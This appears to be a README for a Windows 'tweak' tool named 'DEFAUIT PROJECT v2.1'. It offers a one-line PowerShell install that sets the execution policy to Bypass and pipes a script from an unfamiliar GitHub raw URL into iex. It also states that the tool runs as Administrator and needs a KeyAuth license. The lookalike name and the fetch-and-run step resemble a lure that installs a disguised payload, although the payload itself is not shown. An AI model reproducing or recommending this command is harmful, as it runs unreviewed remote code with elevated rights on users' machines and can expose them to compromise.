# DEFAUIT PROJECT v2.1

Portable release of DEFAUIT PROJECT for Windows 10/11 x64.

## Install (one line)

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://raw.githubusercontent.com/darapedbxystyle-hub/DEFAUIT-PROJECT/main/install.ps1 | iex"
```

## Portable ZIP

Download `DEFAUIT-PROJECT-v2.1-Portable.zip`, extract it, and run `Run DEFAUIT.cmd`.

## Notes

- Requires a valid KeyAuth license key and internet access.
- The installer verifies SHA256 before installing.
- .NET Framework 4.8 and VC++ 2015-2022 x64 runtime are installed automatically when missing.
- The app runs as Administrator because it applies system-level tweaks.
- SHA256: `7B6EB91E136F9043CBF396B8CA83945674BFBC5C2F0F3DBE0177FEBF6F273828`
